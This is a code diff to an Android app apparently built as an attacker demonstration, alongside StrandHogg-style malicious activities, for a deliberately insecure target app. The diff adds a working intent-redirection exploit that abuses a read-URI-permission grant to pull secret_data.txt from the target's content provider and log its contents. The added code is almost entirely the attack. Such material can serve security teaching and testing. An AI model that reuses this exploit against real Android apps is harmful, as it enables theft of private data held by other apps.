@@ -13,6 +13,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Process;
 import android.provider.Settings;
@@ -22,6 +23,9 @@ import com.attacker.app.service.AttackerService;
 import com.attacker.app.strandhogg.DistractionActivity;
 import com.attacker.app.strandhogg.MaliciousActivity;
 
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -30,6 +34,7 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 1;
     private static final String TAG = MainActivity.class.getSimpleName();
+    static final String APP = "com.google.android.googlequicksearchbox";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,6 +49,11 @@ public class MainActivity extends AppCompatActivity {
 
         //Create Notification Channel
         createNotificationChannel();
+
+        // Exploit Insecure app's exposed DB (TempAccessDatabase)
+        if(BuildConfig.GRANT_URI_PERMISSIONS_EXPLOIT){
+            exploitTempAccessDb();
+        }
     }
 
     @Override
@@ -239,4 +249,46 @@ public class MainActivity extends AppCompatActivity {
         NotificationManager notificationManager = getSystemService(NotificationManager.class);
         notificationManager.createNotificationChannel(channel);
     }
+
+    /**
+     * Exploit Insecure Target App's Temp Access DB via intent redirection attack.
+     */
+    public void exploitTempAccessDb(){
+        Intent i1 = new Intent();
+        i1.setData(Uri.parse("content://sg.insecure.target.data.provider.tempaccess/secret_data.txt"));
+        i1.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        i1.setClassName("sg.insecure.insecuretarget", "sg.insecure.insecuretarget.MainActivity");
+        startActivityForResult(i1, 0);
+    }
+
+    /**
+     * Android Native onActivityResult method
+     * @param requestCode The integer request code originally supplied to
+     *                    startActivityForResult(), allowing you to identify who this
+     *                    result came from.
+     * @param resultCode The integer result code returned by the child activity
+     *                   through its setResult().
+     * @param data An Intent, which can return result data to the caller
+     *               (various data can be attached to Intent "extras").
+     *
+     */
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        if (BuildConfig.GRANT_URI_PERMISSIONS_EXPLOIT){
+            try (InputStream inputStream = getContentResolver().openInputStream(data.getData());
+                 BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
+
+                StringBuilder stringBuilder = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    stringBuilder.append(line).append("\n");
+                }
+                Log.d(TAG, "secret_data.txt content: " + stringBuilder.toString());
+            } catch (Throwable th) {
+                throw new RuntimeException(th);
+            }
+        }
+    }
+
 }
